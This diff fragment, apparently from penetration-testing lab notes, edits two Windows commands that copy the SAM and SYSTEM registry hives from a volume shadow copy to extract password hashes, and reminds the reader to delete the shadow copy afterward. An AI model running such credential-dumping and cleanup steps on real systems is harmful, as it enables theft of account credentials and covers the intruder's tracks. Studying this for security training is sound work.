@@ -48,9 +48,9 @@ Now we have the SAM database, it is partially encrypted by either RC4 AES. The e
 the SYSTEM file, which is in the same folder as the SAM
 database. However, it is also locked by the SYSTEM account.
 ```
-C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam
+C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\huifeng1\Downloads\sam
 
-C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system
+C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\huifeng1\Downloads\system
 ```
 
 Don't forget to delete the shadows, {e0331775-2d51-48dc-817e-007a5b97b885} is the shadowID
